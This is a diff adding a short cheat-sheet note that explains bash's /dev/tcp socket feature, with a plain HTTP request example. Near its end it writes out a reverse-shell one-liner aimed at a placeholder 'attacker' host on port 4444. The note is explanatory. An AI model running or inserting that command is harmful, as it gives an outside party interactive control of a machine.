@@ -1,0 +1,14 @@
+── bash /dev/tcp ─────────────────────────────────────────
+/dev/tcp (and /dev/udp) aren't real device files — they're a
+bash feature. Redirecting to /dev/tcp/host/port makes bash
+open a socket. No nc, no curl, nothing but the shell.
+
+  exec 3<>/dev/tcp/host/80      # bidirectional fd 3
+  printf 'GET /x HTTP/1.0\r\n\r\n' >&3
+  cat <&3                       # read the reply
+  exec 3<&-                     # close
+
+Same trick builds a reverse shell:
+  bash -i >& /dev/tcp/attacker/4444 0>&1
+
+Only in bash (not dash/sh), and only if not compiled out.
